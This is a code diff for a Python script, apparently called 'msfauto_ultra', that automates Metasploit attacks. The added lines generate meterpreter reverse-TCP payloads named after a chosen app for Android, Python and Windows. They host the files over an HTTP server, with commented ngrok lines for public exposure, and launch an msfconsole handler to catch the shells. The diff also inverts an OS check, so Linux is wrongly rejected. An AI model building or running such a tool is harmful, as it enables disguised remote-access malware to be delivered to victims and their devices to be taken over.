@@ -1,14 +1,33 @@
+# /bin/shell
 from tkinter import * 
 from colorama import Fore, Back, Style, init
 import platform, os, random, time
 init(autoreset=True)
 class msfauto_ultra():
     def __init__(self, app_name, ip, port_one, port_two, payload):
-        self.app_name = app_name
+        self.app_name = app_name.lower()
         self.ip = ip
         self.port1 = port_one
         self.port2 = port_two
         self.payload = payload
+    def create_malware(self): 
+        if self.payload.lower() == "android": os.system(f"msfvenom -p android/meterpreter/reverse_tcp -f apk > /Output/{self.app_name}.apk")
+        elif self.payload == "mac": os.system(f"msfvenom -p python/meterpreter/reverse_tcp > /Output/{self.app_name}.py")
+        else: os.system(f"msfvenom -p windows/meterpreter/reverse_tcp -f exe > /Output/{self.app_name}.exe")
+        print(Fore.GREEN + "Malware created. continue...")
+    def craete_http_server(self): os.system(f"cd Output && python3 -m http.server {self.port2} -b {self.ip}"), print(Fore.RED + "You closed http server.")
+    def return_links(self):  
+        pass
+        # print(Fore.WHITE + "\n\nThis is the malware download link: ")
+        # print(f"https:")
+        # print(Fore.WHITE + "This is the directory address:")
+        # print(f"http://{self.ip}:{self.port2}/")
+        # # print ngrok command
+        # print(Fore.WHITE + "For ngrok you can use this command:")
+        # print(f"ngrok http {self.port2}")
+    def start_msfconsole(self):
+        print(Style.BRIGHT + Fore.GREEN + "Starting msfconsole...\n")
+        os.system(f'msfconsole -x "set PAYLOAD {self.payload}" -x "use exploit/multi/handler" -x "set LHOST {self.ip}" -x "set LPORT {self.port1}" -x "exploit"')
 def banner():
     banners = {
         1 : f"""{Fore.CYAN}
@@ -63,8 +82,11 @@ __|_________\______/      /  ░▒█░░▒█░▒█▄▄▄█░▒█
     }
     print(banners[random.randint(1, 3)])
 def clear(): os.system("clear")
+def create_output_folder():
+    try: os.mkdir("Output")
+    except FileExistsError: pass
 def check_os():
-    if platform.uname()[0] != "Linux": print(Fore.RED + Style.BRIGHT + "[-] Your platform must be Kali Linux."), exit()
+    if platform.uname()[0] == "Linux": print(Fore.RED + Style.BRIGHT + "[-] Your platform must be Kali Linux."), exit()
     else: print(Fore.GREEN + Style.BRIGHT + "[+] OS Accepted! Continue...")
     time.sleep(5)
     clear()
@@ -89,6 +111,7 @@ def get_info():
     def save():
         with open("config", "w") as writer:
             writer.write(f"{app_name.get()},{ip.get()},{port1.get()},{port2.get()},{payload.get()}")
+            root.destroy()
     Button(root, command=save, text="submit", width=8, height=2).place(x=300, y=290)
     root.geometry("500x350")
     root.title("Get informations")
